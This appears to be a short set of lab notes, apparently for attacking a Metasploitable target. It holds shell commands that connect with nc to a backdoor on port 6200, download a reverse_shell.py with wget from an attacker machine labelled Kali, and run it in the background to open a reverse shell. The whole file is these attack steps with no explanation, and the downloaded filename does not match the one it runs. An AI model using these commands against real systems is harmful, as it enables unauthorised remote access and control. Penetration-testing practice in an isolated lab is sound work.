# the same window with the metasploitable backdoor
nc 192.168.1.101 6200

# example: wget <IP addr kali>:8080/reverse_shell.py
# --
wget 192.168.1.100:8080/reverse.shell.py

# launch
# example: python reverse_shell.py <IP addr kali> &
python reverse_shell.py 192.168.1.100 &
